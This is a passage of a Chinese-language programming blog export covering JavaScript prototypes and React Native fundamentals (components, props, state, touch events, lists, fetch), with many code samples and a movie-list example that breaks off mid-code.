12console.log(dx1.constructor == Obj3) // trueconsole.log(dx2.constructor == Obj3) // true 对象的constructor属性最初用来表示对象类型的。但是，检测对象类型，还是instanceof操作符要更可靠一些—–用来检测一个对象在其原型链中，是否存在一个构造函数的prototype属性。 我们在这个例子中创建的所有对象即使Object的实例，同时也是Obj3的实例，这一点可以通过instanceof操作符可以得到验证。 12345 console.log(dx1 instanceof Obj3); // true console.log(dx1 instanceof Object); // true console.log(dx2 instanceof Obj3); // true console.log(dx2 instanceof Object); // true// dx1 和 dx2 之所以同时是Object的实例，是因为所有的对象均继承自Object ③通过this给这个对象添加属性和方法—看得见 12// this.name = 'Jack'; this.age = 18; ④将这个对象返回给用new关键字调用的构造函数Obj3(name)的调用者（dx1） 1return this; 注：Object在JS中，所有不同类型的对象，都直接或间接的集成于它。 原型对象和原型链原型我们所创建的每一个函数都有一个 prototype （原型）的属性，这个属性是一个指针，指向一个对象，而这个对象的用途包含可以由特定类型的所有实例共享的属性和方法。 那么prototype就可以通过调用构造函数而创建的那个对象实例的原型对象。使用原型对象的好处是可以让所有对象实例共享它所包含的属性和方法。换句话说，不必在构造函数中第一对象实例的信息，而是可以将这些信息直接添加到原型对象中去，那么上面的Obj3（）函数就可以写成这样： 123456789 function Obj3(name,age) &#123; this.name = name; this.age = age; &#125;Obj3.prototype.sayHi = function () &#123; alert(this.name)&#125; var dx1 = new Obj3('Jack', 18); var dx2 = new Obj3('Brush', 18); 在默认情况下，所有原型对象都会自动获得一个constructor（构造函数）属性，这个属性包含一个指向prototype属性所在函数的指针。就拿上面的例子来说，Obj3.prototype.constructor指向Obj3。而通过这个构造函数，我们还可以继续为原型对象添加其他属性和方法。 当构造函数创建一个新实例后，该实例的内部将包含一个指针（内部属性），指向构造函数的原型方法。在每一个对象都支持一个属性：”_ proto _”。 我们可以通过isPrototype()方法来确定对象之间是否存在这个关系。从本质上讲，如果[Prototype]指向调用isPrototype()方法的对象（Obj3.prototype），那么这个方法就返回true： 12console.log(dx1.prototype.isPrototypeOf(Obj3)); // trueconsole.log(dx2.prototype.isPrototypeOf(Obj3)); // true 使用hasOwnProperty()可以检测一个属性是否存在在实例中，还是存在在原型中。这个方法（从Object继承来的）只是给定属性存在在对象实例中，才会返回true；存在在原型中，返回false。 原型对象的原型所有的原型应用类型（Object、Array、String）都在其构造函数的原型上定义了方法。在Array.prototype中可以找到sort（）方法；在String.prototype中可以找到substring（）方法，如下： 12console.log(Array.prototype.sort); // ƒ sort() &#123; [native code] &#125;console.log(String.prototype.substring); // ƒ substring() &#123; [native code] &#125; 原型链原型和实例的关系：每个构造函数都有一个原型对象，原型对象都包含一个指向构造函数的指针，而实例都包含一个指向原型对象的内部指针。如果，我们让这个原型对象等于另一个类型的实例，显然，此时的原型对象包含一个指向另一个原型的指针，相应的，另一个原型中野包含着指向另另一个类型的实例，那么，层层递进，就构成了实例与原型的链条，这就是原型链的基本概念。 我们知道，所有引用类型默认都继承了Object，而这个继承也是通过原型链实现的。所有函数的默认原型都是Object的实例，因此默认原型都包含一个内部指针，指向Object.prototype。这正是所有自定义类型都会继承toString()、valueOf()等默认方式的根本原因。","categories":[{"name":"JavasCript","slug":"JavasCript","permalink":"http://yoursite.com/categories/JavasCript/"}],"tags":[{"name":"JavasCript","slug":"JavasCript","permalink":"http://yoursite.com/tags/JavasCript/"}]},{"title":"RN基础入门","slug":"RN基础入门","date":"2020-03-31T08:14:14.000Z","updated":"2020-06-18T07:09:21.404Z","comments":true,"path":"posts/e61ae078.html","link":"","permalink":"http://yoursite.com/posts/e61ae078.html","excerpt":"","text":"入门基础核心组件和原生组件原生组件使用React Native，您可以使用React组件通过JavaScript调用Android 和IOS视图。 在运行时，React Native为这些组件创建相应的Android和iOS视图。 由于React Native组件具有与Android和iOS相同的视图支持，因此React Native应用的外观，感觉和性能与其他任何应用一样。 我们将这些平台支持的组件称为“本机组件”。 通过React Native，您可以为Android和iOS构建自己的Native Components，以满足您应用的独特需求。 我们还有一个由社区贡献的组成部分的繁荣生态系统。 查看本机目录以查找社区正在创建的内容。 React Native还包括一组基本的，随时可用的Native组件，您可以使用它们立即开始构建您的应用程序。 这些是React Native的核心组件。 核心组件React Native具有许多核心组件，从表单控件到活动指示器，应有尽有。 您可以在API部分找到所有记录的文档。 您将主要使用以下核心组件： RN UI 组件 ANDROID VIEW IOS VIEW WEB ANALOG 说明 &lt;View&gt; &lt;ViewGroup&gt; &lt;UIView&gt; A non-scrollling &lt;div&gt; 支持flexbox布局、样式、一些触摸处理和可访问性控制的容器 &lt;Text&gt; &lt;TextView&gt; &lt;UITextView&gt; &lt;p&gt; 显示，设置样式和嵌套文本字符串，甚至处理触摸事件 &lt;Image&gt; &lt;ImageView&gt; &lt;UIImageView&gt; &lt;img&gt; 显示不同类型的图像 &lt;ScrollView&gt; &lt;ScrollView&gt; &lt;UIScrollView&gt; &lt;div&gt; 通用滚动容器，可以包含多个组件和视图 &lt;TextInput&gt; &lt;EditText&gt; &lt;UITextField&gt; &lt;input type=&quot;text&quot;&gt; 允许用户输入文字 1234567891011121314151617181920212223242526import React, &#123; useState &#125; from 'react';import &#123; View, Text, Image, ScrollView, TextInput, FlatList &#125; from 'react-native';const App = () =&gt; &#123; return ( &lt;ScrollView&gt; &lt;Text&gt;Some text&lt;/Text&gt; &lt;View&gt; &lt;Text&gt;Some moqqqre text&lt;/Text&gt; &lt;Image source=&#123;&#123;uri: 'bd'&#125;&#125; style=&#123;&#123;width: 200, height: 200&#125;&#125;&gt;&lt;/Image&gt; &lt;Image source=&#123;require('./1.png')&#125; style=&#123;&#123;width: 200, height: 200, borderColor: 'gray', borderWidth: 1&#125;&#125;/&gt; &lt;Image source=&#123;&#123;uri: \"https://facebook.github.io/react-native/docs/assets/p_cat2.png\"&#125;&#125; style=&#123;&#123;width: 200, height: 200&#125;&#125;/&gt; &lt;/View&gt; &lt;TextInput style=&#123;&#123; height: 40, borderColor: 'gray', borderWidth: 1 &#125;&#125; defaultValue=\"You can type in me\" /&gt; &lt;/ScrollView&gt; )&#125;export default App; React基础组件Function Component 1234567import React from 'react';import &#123; Text &#125; from 'react-native';export default function Cat() &#123; return ( &lt;Text&gt;Hello, I am your cat!&lt;/Text&gt; );&#125; Class Component123456789import React, &#123; Component &#125; from 'react';import &#123; Text &#125; from 'react-native';export default class Cat extends Component &#123; render() &#123; return ( &lt;Text&gt;Hello, I am your cat!&lt;/Text&gt; ); &#125;&#125; 这两种不同的组件之间的本质区别就是：有无state属性 和 生命周期函数！ JSX123456789101112import React from 'react';import &#123; Text &#125; from 'react-native';export default function Cat() &#123; function getFullName(firstName, secondName, thirdName) &#123; return firstName + \" \" + secondName + \" \" + thirdName; &#125; return ( &lt;Text&gt; Hello, I am &#123;getFullName(\"Rum\", \"Tum\", \"Tugger\")&#125;! &lt;/Text&gt; );&#125; 自定义组件12345678910111213141516171819202122232425262728293031323334import React, &#123; Component &#125; from \"react\";import &#123; Button, Text, View &#125; from \"react-native\";export class Cat extends Component &#123; state = &#123; isHungry: true &#125;; render(props) &#123; return ( &lt;View&gt; &lt;Text&gt; I am &#123;this.props.name&#125;, and I am &#123;this.state.isHungry ? \" hungry\" : \" full\"&#125;! &lt;/Text&gt; &lt;Button onPress=&#123;() =&gt; &#123; this.setState(&#123; isHungry: false &#125;); &#125;&#125; disabled=&#123;!this.state.isHungry&#125; title=&#123; this.state.isHungry ? \"Pour me some milk, please!\" : \"Thank you!\" &#125; /&gt; &lt;/View&gt; ); &#125;&#125;export default class Cafe extends Component &#123; render() &#123; return ( &lt;&gt; &lt;Cat name=\"Munkustrap\" /&gt; &lt;Cat name=\"Spot\" /&gt; &lt;/&gt; ); &#125;&#125; props类似于vue的父子组件传值 123456789101112131415161718import React from 'react';import &#123; Text, View &#125; from 'react-native';function Cat(props) &#123; return ( &lt;View&gt; &lt;Text&gt;Hello, I am &#123;props.name&#125;!&lt;/Text&gt; &lt;/View&gt; );&#125;export default function Cafe() &#123; return ( &lt;View&gt; &lt;Cat name=\"Maru\" /&gt; &lt;Cat name=\"Jellylorum\" /&gt; &lt;Cat name=\"Spot\" /&gt; &lt;/View&gt; );&#125; state类似于vue data对象 useState： [&lt;getter&gt;, &lt;setter&gt;] = useState(&lt;initialValue&gt;)。 在函数组件中调用useState，就会创建一个单独的状态。 在类组件中，state 总是一个对象，可以在该对象上添加保存属性。 每次调用useState都会创建一个state块，其中包含一个值。 12345678910111213141516171819202122232425262728import React, &#123; useState &#125; from \"react\";import &#123; Button, Text, View &#125; from \"react-native\";function Cat(props) &#123; // 创建一个状态，并将其初始化为“true” const [isHungry, setIsHungry] = useState(true); return ( &lt;View&gt; &lt;Text&gt; I am &#123;props.name&#125;, and I am &#123;isHungry ? \"hungry\" : \"full\"&#125;! &lt;/Text&gt; &lt;Button onPress=&#123;() =&gt; &#123; setIsHungry(false); &#125;&#125; disabled=&#123;!isHungry&#125; title=&#123;isHungry ? \"Pour me some milk, please!\" : \"Thank you!\"&#125; /&gt; &lt;/View&gt; );&#125;export default function Cafe() &#123; return ( &lt;&gt; &lt;Cat name=\"Munkustrap\" /&gt; &lt;Cat name=\"Spot\" /&gt; &lt;/&gt; );&#125; 123456789101112131415161718192021222324252627282930313233343536import React, &#123; Component &#125; from \"react\";import &#123; Button, Text, View &#125; from \"react-native\";export class Cat extends Component &#123; // 声明状态 state = &#123; isHungry: true &#125;; render(props) &#123; return ( &lt;View&gt; &lt;Text&gt; I am &#123;this.props.name&#125;, and I am &#123;this.state.isHungry ? \" hungry\" : \" full\"&#125;! &lt;/Text&gt; &lt;Button onPress=&#123;() =&gt; &#123; &#123;/* 通过 setState 改变状态 */&#125; this.setState(&#123; isHungry: false &#125;); &#125;&#125; disabled=&#123;!this.state.isHungry&#125; title=&#123; this.state.isHungry ? \"Pour me some milk, please!\" : \"Thank you!\" &#125; /&gt; &lt;/View&gt; ); &#125;&#125;export default class Cafe extends Component &#123; render() &#123; return ( &lt;&gt; &lt;Cat name=\"Munkustrap\" /&gt; &lt;Cat name=\"Spot\" /&gt; &lt;/&gt; ); &#125;&#125; RN的Props原生组件的props以常见的基础组件Image为例，在创建一个图片时，可以传入一个名为source的 prop 来指定要显示的图片的地址，以及使用名为style的 prop 来控制其尺寸。 12345678910111213import React, &#123; Component &#125; from 'react';import &#123; Image &#125; from 'react-native';export default class Bananas extends Component &#123; render() &#123; let pic = &#123; uri: 'https://upload.wikimedia.org/wikipedia/commons/d/de/Bananavarieties.jpg' &#125;; return ( &lt;Image source=&#123;pic&#125; style=&#123;&#123;width: 193, height: 110&#125;&#125; /&gt; ); &#125;&#125; 自定义组件12345678910111213141516171819202122232425import React, &#123; Component &#125; from 'react';import &#123; Text, View &#125; from 'react-native';class Greeting extends Component &#123; render() &#123; return ( &lt;View style=&#123;&#123;alignItems: 'center', marginTop: 50&#125;&#125;&gt; &#123;/* Greeting组件中将name作为一个属性来定制 */&#125; &lt;Text&gt;Hello &#123;this.props.name&#125;!&lt;/Text&gt; &lt;/View&gt; ); &#125;&#125;export default class LotsOfGreetings extends Component &#123; render() &#123; return ( &lt;View style=&#123;&#123;alignItems: 'center'&#125;&#125;&gt; &lt;Greeting name='Rexxar' /&gt; &lt;Greeting name='Jaina' /&gt; &lt;Greeting name='Valeera' /&gt; &lt;/View&gt; ); &#125;&#125; RN中的State一般来说，你需要在class中声明一个state对象，然后在需要修改时调用setState方法。 假如我们需要制作一段不停闪烁的文字。文字内容本身在组件创建时就已经指定好了，所以文字内容应该是一个prop。而文字的显示或隐藏的状态（快速的显隐切换就产生了闪烁的效果）则是随着时间变化的，因此这一状态应该写到state中。 12345678910111213141516171819202122232425262728293031323334353637383940import React, &#123; Component &#125; from 'react';import &#123; Text, View &#125; from 'react-native';class Blink extends Component &#123; // 声明state对象 state = &#123; isShowingText: true &#125;; componentDidMount() &#123; // 每1000毫秒对showText状态做一次取反操作 setInterval(() =&gt; &#123; this.setState(&#123; isShowingText: !this.state.isShowingText &#125;); &#125;, 1000); &#125; render() &#123; // 根据当前showText的值决定是否显示text内容 if (!this.state.isShowingText) &#123; return null; &#125; return ( &lt;Text&gt;&#123;this.props.text&#125;&lt;/Text&gt; ); &#125;&#125;export default class BlinkApp extends Component &#123; render() &#123; return ( &lt;View&gt; &lt;Blink text='I love to blink' /&gt; &lt;Blink text='Yes blinking is so great' /&gt; &lt;Blink text='Why did they ever take this out of HTML' /&gt; &lt;Blink text='Look at me look at me look at me' /&gt; &lt;/View&gt; ); &#125;&#125; 实际开发中，==我们一般不会在定时器函数（setInterval、setTimeout 等）中来操作 state==。典型的场景是在接收到服务器返回的新数据，或者在用户输入数据之后。你也可以使用一些“状态容器”比如Redux来统一管理数据流。 一切界面变化都是状态state变化 state的修改必须通过setState()方法 this.state.likes = 100; // 这样的直接赋值修改无效！ setState 是一个 merge 合并操作，只修改指定属性，不影响其他属性 setState 是异步操作，修改不会马上生效 处理文本输入TextInput是一个允许用户输入文本的基础组件。 它有一个名为onChangeText的属性，此属性接受一个函数，而此函数会在文本变化时被调用。 另外还有一个名为onSubmitEditing的属性，会在文本被提交后（用户按下软键盘上的提交键）调用。 123456789101112131415161718 /** 处理文本输入 每输入一个单词就得到一块 🍕 */function PizzaTranslator() &#123; const [text, setText] = useState(''); return ( &lt;View style=&#123;&#123;padding: 10&#125;&#125;&gt; &lt;TextInput style=&#123;&#123;height: 40, backgroundColor: '#ccc'&#125;&#125; placeholder=\"Type here to translate!\" onChangeText=&#123;text =&gt; setText(text)&#125; defaultValue=&#123;text&#125; /&gt; &lt;Text style=&#123;&#123;padding: 10, fontSize: 42&#125;&#125;&gt; &#123;text.split(' ').map((word) =&gt; word &amp;&amp; '🍕').join(' ')&#125; &lt;/Text&gt; &lt;/View&gt; );&#125; 处理触摸事件onPress 事件123456&lt;Button onPress=&#123;() =&gt; &#123; Alert.alert(\"你点击了按钮！\"); &#125;&#125; title=\"点我！\"/&gt; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849class App extends Component &#123; _onPressButton() &#123; Alert.alert('You tapped the button!') &#125; render() &#123; const styles = StyleSheet.create(&#123; container: &#123; flex: 1, justifyContent: 'center', &#125;, buttonContainer: &#123; margin: 20 &#125;, alternativeLayoutButtonContainer: &#123; margin: 20, flexDirection: 'row', justifyContent: 'space-between' &#125; &#125;) return ( &lt;View style=&#123;styles.container&#125;&gt; &lt;View style=&#123;styles.buttonContainer&#125;&gt; &lt;Button onPress=&#123;this._onPressButton&#125; title=\"Press Me\" /&gt; &lt;/View&gt; &lt;View style=&#123;styles.buttonContainer&#125;&gt; &lt;Button onPress=&#123;this._onPressButton&#125; title=\"Press Me\" color=\"#841584\" /&gt; &lt;/View&gt; &lt;View style=&#123;styles.alternativeLayoutButtonContainer&#125;&gt; &lt;Button onPress=&#123;this._onPressButton&#125; title=\"This looks great!\" /&gt; &lt;Button onPress=&#123;this._onPressButton&#125; title=\"OK!\" color=\"#841584\" /&gt; &lt;/View&gt; &lt;/View&gt; ); &#125;&#125; Touchable 系列组件 一般来说，你可以使用TouchableHighlight来制作按钮或者链接。注意此组件的背景会在用户手指按下时变暗。 在 Android 上还可以使用TouchableNativeFeedback，它会在用户手指按下时形成类似墨水涟漪的视觉效果。 TouchableOpacity会在用户手指按下时降低按钮的透明度，而不会改变背景的颜色。 如果你想在处理点击事件的同时不显示任何视觉反馈，则需要使用TouchableWithoutFeedback。 检测用户是否进行了长按，组件中使用onLongPress属性来实现。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970import React, &#123; Component &#125; from 'react';import &#123; Alert, Platform, StyleSheet, Text, TouchableHighlight, TouchableOpacity, TouchableNativeFeedback, TouchableWithoutFeedback, View &#125; from 'react-native';class App extends Component &#123; _onPressButton() &#123; Alert.alert('You tapped the button!') &#125; _onLongPressButton() &#123; Alert.alert('You long-pressed the button!') &#125; render() &#123; const styles = StyleSheet.create(&#123; container: &#123; paddingTop: 60, alignItems: 'center' &#125;, button: &#123; marginBottom: 30, width: 260, alignItems: 'center', backgroundColor: '#2196F3' &#125;, buttonText: &#123; textAlign: 'center', padding: 20, fontSize: 16, color: '#fff' &#125; &#125;) return ( &lt;View style=&#123;styles.container&#125;&gt; &#123;/* 组件的背景会在用户手指按下时变暗。 */&#125; &lt;TouchableHighlight onPress=&#123;this._onPressButton&#125; underlayColor=\"white\"&gt; &lt;View style=&#123;styles.button&#125;&gt; &lt;Text style=&#123;styles.buttonText&#125;&gt;TouchableHighlight&lt;/Text&gt; &lt;/View&gt; &lt;/TouchableHighlight&gt; &#123;/* 用户手指按下时降低按钮的透明度，而不会改变背景的颜色。 */&#125; &lt;TouchableOpacity onPress=&#123;this._onPressButton&#125;&gt; &lt;View style=&#123;styles.button&#125;&gt; &lt;Text style=&#123;styles.buttonText&#125;&gt;TouchableOpacity&lt;/Text&gt; &lt;/View&gt; &lt;/TouchableOpacity&gt; &#123;/* Android 用户手指按下时形成类似墨水涟漪的视觉效果。 */&#125; &lt;TouchableNativeFeedback onPress=&#123;this._onPressButton&#125; background=&#123;Platform.OS === 'android' ? TouchableNativeFeedback.SelectableBackground() : ''&#125;&gt; &lt;View style=&#123;styles.button&#125;&gt; &lt;Text style=&#123;styles.buttonText&#125;&gt;TouchableNativeFeedback&lt;/Text&gt; &lt;/View&gt; &lt;/TouchableNativeFeedback&gt; &#123;/* 不显示任何视觉反馈 */&#125; &lt;TouchableWithoutFeedback onPress=&#123;this._onPressButton&#125; &gt; &lt;View style=&#123;styles.button&#125;&gt; &lt;Text style=&#123;styles.buttonText&#125;&gt;TouchableWithoutFeedback&lt;/Text&gt; &lt;/View&gt; &lt;/TouchableWithoutFeedback&gt; &#123;/* 绑定单击 和 长按事件 */&#125; &lt;TouchableHighlight onPress=&#123;this._onPressButton&#125; onLongPress=&#123;this._onLongPressButton&#125; underlayColor=\"white\"&gt; &lt;View style=&#123;styles.button&#125;&gt; &lt;Text style=&#123;styles.buttonText&#125;&gt;Touchable with Long Press&lt;/Text&gt; &lt;/View&gt; &lt;/TouchableHighlight&gt; &lt;/View&gt; ); &#125;&#125; 滚动视图ScrollView是一个通用的可滚动的容器，你可以在其中放入多个组件和视图，而且这些组件并不需要是同类型的。ScrollView 不仅可以垂直滚动，还能水平滚动（通过horizontal属性来设置）。 下面的示例代码创建了一个垂直滚动的ScrollView，其中还混杂了图片和文字组件。 123456789101112131415161718192021222324252627282930313233343536373839class App extends Component &#123; render() &#123; return ( &lt;ScrollView style=&#123;&#123;backgroundColor: '#df02d0'&#125;&#125;&gt; &lt;Text style=&#123;&#123;fontSize:48&#125;&#125;&gt;Scroll me plz&lt;/Text&gt; &lt;Image source=&#123;require('./1.png')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: 'gray', borderWidth: 1&#125;&#125; /&gt; &lt;Image source=&#123;require('./1.png')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: 'gray', borderWidth: 1&#125;&#125; /&gt; &lt;Image source=&#123;require('./1.png')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: 'gray', borderWidth: 1&#125;&#125; /&gt; &lt;Image source=&#123;require('./1.png')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: 'gray', borderWidth: 1&#125;&#125; /&gt; &lt;Image source=&#123;require('./1.png')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: 'gray', borderWidth: 1&#125;&#125; /&gt; &lt;Text style=&#123;&#123;fontSize:48&#125;&#125;&gt;If you like&lt;/Text&gt; &lt;Image source=&#123;require('./1.png')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: 'gray', borderWidth: 1&#125;&#125; /&gt; &lt;Image source=&#123;require('./1.png')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: 'gray', borderWidth: 1&#125;&#125; /&gt; &lt;Image source=&#123;require('./1.png')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: 'gray', borderWidth: 1&#125;&#125; /&gt; &lt;Image source=&#123;require('./1.png')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: 'gray', borderWidth: 1&#125;&#125; /&gt; &lt;Image source=&#123;require('./1.png')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: 'gray', borderWidth: 1&#125;&#125; /&gt; &lt;Text style=&#123;&#123;fontSize:48&#125;&#125;&gt;Scrolling down&lt;/Text&gt; &lt;Image source=&#123;require('./1.png')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: 'gray', borderWidth: 1&#125;&#125; /&gt; &lt;Image source=&#123;require('./1.png')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: 'gray', borderWidth: 1&#125;&#125; /&gt; &lt;Image source=&#123;require('./1.png')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: 'gray', borderWidth: 1&#125;&#125; /&gt; &lt;Image source=&#123;require('./1.png')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: 'gray', borderWidth: 1&#125;&#125; /&gt; &lt;Image source=&#123;require('./1.png')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: 'gray', borderWidth: 1&#125;&#125; /&gt; &lt;Text style=&#123;&#123;fontSize:48&#125;&#125;&gt;What's the best&lt;/Text&gt; &lt;Image source=&#123;require('./1.png')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: 'gray', borderWidth: 1&#125;&#125; /&gt; &lt;Image source=&#123;require('./1.png')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: 'gray', borderWidth: 1&#125;&#125; /&gt; &lt;Image source=&#123;require('./1.png')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: 'gray', borderWidth: 1&#125;&#125; /&gt; &lt;Image source=&#123;require('./1.png')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: 'gray', borderWidth: 1&#125;&#125; /&gt; &lt;Image source=&#123;require('./1.png')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: 'gray', borderWidth: 1&#125;&#125; /&gt; &lt;Text style=&#123;&#123;fontSize:48&#125;&#125;&gt;Framework around?&lt;/Text&gt; &lt;Image source=&#123;require('./1.png')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: 'gray', borderWidth: 1&#125;&#125; /&gt; &lt;Image source=&#123;require('./1.png')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: 'gray', borderWidth: 1&#125;&#125; /&gt; &lt;Image source=&#123;require('./1.png')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: 'gray', borderWidth: 1&#125;&#125; /&gt; &lt;Image source=&#123;require('./1.png')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: 'gray', borderWidth: 1&#125;&#125; /&gt; &lt;Image source=&#123;require('./1.png')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: 'gray', borderWidth: 1&#125;&#125; /&gt; &lt;Text style=&#123;&#123;fontSize:80&#125;&#125;&gt;React Native&lt;/Text&gt; &lt;/ScrollView&gt; );&#125;&#125; ScrollView适合用来显示数量不多的滚动元素。放置在ScrollView中的所有组件都会被渲染，哪怕有些组件因为内容太长被挤出了屏幕外。 长列表FlatList组件用于显示一个==垂直的滚动列表==，其中的元素之间结构近似而仅数据不同。 FlatList更适于==长列表数据，且元素个数可以增删。==和ScrollView不同的是，FlatList并==不立即渲染所有元素，而是优先渲染屏幕上可见的元素。== FlatList组件必须的两个属性是data和renderItem。data是列表的数据源，而renderItem则从数据源中逐个解析数据，然后返回一个设定好格式的组件来渲染。 123456789101112131415161718192021222324252627class App extends Component &#123; render() &#123; const styles = StyleSheet.create(&#123; container: &#123; flex: 1, paddingTop: 22 &#125;, item: &#123; padding: 10, fontSize: 18, height: 44, borderBottomColor: '#f0f', borderBottomWidth: 1 &#125;, &#125;) const arr = [ &#123;key: 'Devin'&#125;, &#123;key: 'Julie'&#125;, &#123;key: 'Dan'&#125;, &#123;key: 'Dominic'&#125;, &#123;key: 'Jackson'&#125;, &#123;key: 'James'&#125;, &#123;key: 'Joel'&#125;, &#123;key: 'John'&#125;, &#123;key: 'Jillian'&#125;, &#123;key: 'Jimmy'&#125;, &#123;key: 'Dan'&#125;, &#123;key: 'Dominic'&#125;, &#123;key: 'Jackson'&#125;, &#123;key: 'James'&#125;, &#123;key: 'Joel'&#125;, &#123;key: 'John'&#125;, &#123;key: 'Jillian'&#125;, &#123;key: 'Jimmy'&#125;, ] return ( &lt;View style=&#123;styles.container&#125;&gt; &lt;FlatList data=&#123; arr &#125; renderItem=&#123;(&#123;item&#125;) =&gt; &lt;Text style=&#123;styles.item&#125;&gt;&#123;item.key&#125;&lt;/Text&gt;&#125; /&gt; &lt;/View&gt; ); &#125;&#125; 如果要渲染的是一组需要分组的数据，也许还带有分组标签的，那么SectionList将是个不错的选择 123456789101112131415161718192021222324252627282930313233343536373839404142class App extends Component &#123; render() &#123; const arr = [ &#123;title: 'A', data: ['Aevin', 'Aan', 'Aominic']&#125;, &#123;title: 'B', data: ['Bevin', 'Ban', 'Bominic']&#125;, &#123;title: 'D', data: ['Devin', 'Dan', 'Dominic']&#125;, &#123;title: 'J', data: ['Jackson', 'James', 'Jillian', 'Jimmy', 'Joel', 'John', 'Julie']&#125;, ] return ( &lt;View style=&#123;styles.container&#125;&gt; &lt;SectionList sections=&#123;arr&#125; renderItem=&#123;(&#123;item&#125;) =&gt; &lt;Text style=&#123;styles.item&#125;&gt;&#123;item&#125;&lt;/Text&gt;&#125; renderSectionHeader=&#123;(&#123;section&#125;) =&gt; &lt;Text style=&#123;styles.sectionHeader&#125;&gt;&#123;section.title&#125;&lt;/Text&gt;&#125; keyExtractor=&#123;(item, index) =&gt; index&#125; /&gt; &lt;/View&gt; ); &#125;&#125;const styles = StyleSheet.create(&#123; container: &#123; flex: 1, paddingTop: 22 &#125;, sectionHeader: &#123; paddingTop: 2, paddingLeft: 10, paddingRight: 10, paddingBottom: 2, fontSize: 14, fontWeight: 'bold', backgroundColor: 'rgba(247,247,247,1.0)', borderTopWidth: 1, borderTopColor: '#db5420' &#125;, item: &#123; padding: 10, fontSize: 18, height: 44, &#125;,&#125;) 网络（进行中）使用 Fetch发起请求1234567891011fetch('https://mywebsite.com/endpoint/', &#123; method: 'POST', headers: &#123; Accept: 'application/json', 'Content-Type': 'application/json', &#125;, body: JSON.stringify(&#123; firstParam: 'yourValue', secondParam: 'yourOtherValue', &#125;),&#125;); 处理服务器的响应数据Fetch 方法会返回一个Promise，这种模式可以简化异步风格的代码 12345678910111213141516171819202122232425function getMoviesFromApiAsync() &#123; return fetch('https://facebook.github.io/react-native/movies.json') .then((response) =&gt; response.json()) .then((responseJson) =&gt; &#123; return responseJson.movies; &#125;) .catch((error) =&gt; &#123; console.error(error); &#125;);&#125;// async/await 语法：// 注意这个方法前面有async关键字async function getMoviesFromApi() &#123; try &#123; // 注意这里的await语句，其所在的函数必须有async关键字声明 let response = await fetch( 'https://facebook.github.io/react-native/movies.json', ); let responseJson = await response.json(); return responseJson.movies; &#125; catch (error) &#123; console.error(error); &#125;&#125; 测试(catch 住fetch可能抛出的异常) 123456789101112131415161718192021222324252627282930313233343536373839class App extends Component &#123; constructor(props)&#123; super(props); this.state =&#123; isLoading: true&#125; &#125; componentDidMount()&#123; // ***************** return fetch('https://facebook.github.io/react-native/movies.json') .then((response) =&gt; response.json()) .then((responseJson) =&gt; &#123; this.setState(&#123; isLoading: false, dataSource: responseJson.movies, &#125;, function()&#123; &#125;); &#125;) .catch((error) =&gt;&#123; console.error(error); &#125;); &#125; render()&#123; if(this.state.isLoading)&#123; return( &lt;View style=&#123;&#123;flex: 1, padding: 20&#125;&#125;&gt; &lt;ActivityIndicator/&gt; &lt;/View&gt; ) &#125; return( &lt;View style=&#123;&#123;flex: 1, paddingTop:20&#125;&#125;&gt; &lt;FlatList data=&#123;this.state.dataSource&#125; renderItem=&#123;(&#123;item&#125;) =&gt; &lt;Text&gt;&#123;item.title&#125;, &#123;item.releaseYear&#125;&lt;/Text&gt;&#125; keyExtractor=&#123;(item, index) =&gt; item.id&#125; /&gt; &lt;/View&gt; ); &#125;&#125; 从 Android9 开始，也会默认阻止 http 请求，请参考相关配置 默认情况下，iOS 会阻止所有 http 的请求，以督促开发者使用 https。如果你仍然需要使用 http 协议，那么首先需要添加一个 App Transport Security 的例外，详细可参考这篇帖子。 使用其他的网络库React Native 中已经内置了XMLHttpRequest API(也就是俗称的 ajax)。一些基于 XMLHttpRequest 封装的第三方库也可以使用，例如frisbee或是axios等。但注意不能使用 jQuery。 在应用中你可以访问任何网站，没有跨域的限制。 电影列表 在一个FlatList中展示出电影列表。 准备工作使用cli工具创建一个工程： 1react-native init SampleAppMovies 这条命令除了会下载js文件，还会下载在SampleAppMovies/iOS/SampleAppMovies.xcodeproj和SampleAppMovies/android/app下分别创建一个新的 XCode 工程(iOS)和一个 gradle 工程(Android)。 开发Android版本：先连接设备或启动模拟器，然后在SampleAppMovies目录下运行react-native run-android，就会构建工程。 电影列表 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111import React, &#123; useState, Component &#125; from 'react';import &#123; View, Text, Button, Alert, Platform, Image, ScrollView, TextInput, FlatList, SectionList, ActivityIndicator, StyleSheet, TouchableHighlight, TouchableOpacity, TouchableNativeFeedback, TouchableWithoutFeedback &#125; from 'react-native';// 原 urlconst REQUEST_URL = \"https://raw.githubusercontent.com/facebook/react-native/0.51-stable/docs/MoviesExample.json\";class App extends Component &#123; constructor(props) &#123; super(props); this.state = &#123; data: [], loaded: false &#125;; this.fetchData = this.fetchData.bind(this); &#125; // 请求数据 fetchData() &#123; let data = require('./test/moivelist.json') // 通过定时器 模拟ajax setTimeout(() =&gt; &#123; this.setState(&#123; data: data.movies, loaded: true &#125;); &#125;, 3000) // 真正请求的ajax // 